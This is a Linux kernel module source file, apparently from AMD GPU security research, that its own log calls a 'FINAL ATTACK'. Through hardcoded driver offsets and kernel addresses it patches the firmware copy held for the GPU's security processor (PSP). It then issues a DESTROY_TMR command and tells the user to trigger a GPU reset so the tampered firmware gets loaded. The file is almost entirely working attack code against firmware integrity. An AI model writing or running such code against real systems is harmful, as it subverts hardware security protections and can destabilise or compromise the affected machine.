#include <linux/module.h>
#include <linux/pci.h>
#include <linux/delay.h>
#include <linux/slab.h>
MODULE_LICENSE("GPL");

struct psp_cmd { u32 buf_size, buf_version, cmd_id, r1,r2,r3,r4; u32 data[32]; u32 resp[16]; };
typedef int (*psp_fn)(void*, void*, struct psp_cmd*, u64);
typedef u32 (*rreg_fn)(void*, u32);

static int __init fa_init(void) {
    struct pci_dev *p = pci_get_device(0x1002,0x1586,NULL);
    void *a, *psp; psp_fn submit; rreg_fn rr;
    struct psp_cmd *cmd; u64 fence_mc;
    void *fw_pri; u32 gc = 0x2800;

    if (!p) return -ENODEV;
    a = (u8*)pci_get_drvdata(p) - 0x10;
    psp = (u8*)a + 0x3B910;
    fw_pri = (void*)*(u64*)((u8*)psp + 0x058);
    fence_mc = *(u64*)((u8*)psp + 0x1B8);
    submit = (psp_fn)0xFFFFFFFFC1070840ULL;
    rr = (rreg_fn)0xFFFFFFFFC0F43460ULL;
    cmd = kzalloc(sizeof(*cmd), GFP_KERNEL);
    if (!cmd) { pci_dev_put(p); return -ENOMEM; }

    pr_info("fa: === FINAL ATTACK: PATCH + DESTROY_TMR ===\n");

    /* Step 1: Patch the firmware blob in fw_pri at PC=0x800 */
    {
        u32 *code = (u32*)((u8*)fw_pri + 0x4000);
        pr_info("fa: fw_pri[0x800] orig: %08X %08X %08X %08X\n",
            code[0], code[1], code[2], code[3]);
        code[0] = 0x00000013; /* NOP */
        code[1] = 0x00000013;
        code[2] = 0x00000013;
        code[3] = 0xFF5FF06F; /* JAL loop */
        pr_info("fa: fw_pri PATCHED at PC=0x800\n");
    }

    /* Step 2: DESTROY_TMR — force PSP to reload on next init */
    pr_info("fa: Step 2: DESTROY_TMR...\n");
    memset(cmd, 0, sizeof(*cmd));
    cmd->buf_size = sizeof(*cmd); cmd->buf_version = 1;
    cmd->cmd_id = 0x07;
    {
        int ret = submit(psp, NULL, cmd, fence_mc);
        pr_info("fa: DESTROY_TMR ret=%d resp=0x%X\n", ret, cmd->resp[0]);
    }

    /* Step 3: Module stays loaded. User triggers GPU reset:
     *   sudo cat /sys/kernel/debug/dri/0000:c3:00.0/amdgpu_gpu_recover
     *
     * With TMR destroyed, PSP MUST reload firmware during reset.
     * It will read from fw_pri (our patched copy).
     * PSP loads patched firmware → sets IC_BASE → starts MEC.
     *
     * After reset, check:
     *   sudo insmod /tmp/psp2/mec_check2.ko
     */
    pr_info("fa: TMR destroyed. fw_pri patched.\n");
    pr_info("fa: NOW TRIGGER RESET FROM USERSPACE:\n");
    pr_info("fa:   sudo cat /sys/kernel/debug/dri/0000:c3:00.0/amdgpu_gpu_recover\n");
    pr_info("fa: Then check MEC state.\n");

    kfree(cmd);
    pci_dev_put(p);
    return 0; /* Stay loaded */
}
static void __exit fa_exit(void) { pr_info("fa: unloaded\n"); }
module_init(fa_init); module_exit(fa_exit);
